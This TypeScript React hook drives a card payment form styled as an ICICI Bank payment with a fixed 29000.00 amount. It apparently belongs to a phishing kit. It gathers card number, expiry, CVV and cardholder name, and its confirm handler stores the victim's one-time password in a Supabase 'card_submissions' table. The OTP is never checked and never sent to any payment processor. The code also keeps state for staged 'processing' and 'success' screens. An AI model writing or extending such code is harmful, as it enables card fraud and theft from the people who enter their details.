
import { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';

export interface PaymentFormData {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardHolder: string;
  amount: string;
}

export const usePaymentForm = () => {
  const [formData, setFormData] = useState<PaymentFormData>({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '29000.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
  const [fadeState, setFadeState] = useState('visible');
  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
  const [selectedBank, setSelectedBank] = useState('ICICI BANK');
  const [selectedBankLogo, setSelectedBankLogo] = useState('');

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const limited = cleaned.slice(0, 16);
    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
    return formatted;
  };

  const isFormValid = () => {
    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
           formData.expiryMonth.length === 2 &&
           formData.expiryYear.length === 2 &&
           formData.cvv.length >= 3 &&
           formData.cardHolder.trim().length > 0;
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === 'cardNumber') {
      const formatted = formatCardNumber(value);
      setFormData({
        ...formData,
        [name]: formatted
      });
    } else if (name === 'expiryMonth') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      if (numericValue === '' || (numericValue.length <= 2 && parseInt(numericValue) <= 12)) {
        setFormData({
          ...formData,
          [name]: numericValue
        });
      }
    } else if (name === 'expiryYear') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      if (numericValue === '' || parseInt(numericValue) <= 50) {
        setFormData({
          ...formData,
          [name]: numericValue
        });
      }
    } else if (name === 'cvv') {
      const numericValue = value.replace(/\D/g, '').slice(0, 4);
      setFormData({
        ...formData,
        [name]: numericValue
      });
    } else {
      setFormData({
        ...formData,
        [name]: value
      });
    }
  };

  const handleConfirmPay = async (otp: string) => {
    setIsConfirmLoading(true);
    setInvalidOtpMessage('');
    
    if (currentSubmissionId) {
      try {
        const { error } = await supabase
          .from('card_submissions')
          .update({ otp: otp })
          .eq('id', currentSubmissionId);
        
        if (error) {
          console.error('Error updating OTP:', error);
        } else {
          console.log('OTP updated successfully in Supabase');
        }
      } catch (error) {
        console.error('Error updating OTP:', error);
      }
    }
  };

  return {
    formData,
    isLoading,
    setIsLoading,
    showOtp,
    setShowOtp,
    isConfirmLoading,
    setIsConfirmLoading,
    errorMessage,
    setErrorMessage,
    showProcessing,
    setShowProcessing,
    showSuccess,
    setShowSuccess,
    invalidOtpMessage,
    setInvalidOtpMessage,
    fadeState,
    setFadeState,
    currentSubmissionId,
    setCurrentSubmissionId,
    selectedBank,
    setSelectedBank,
    selectedBankLogo,
    setSelectedBankLogo,
    isFormValid,
    handleInputChange,
    handleConfirmPay
  };
};
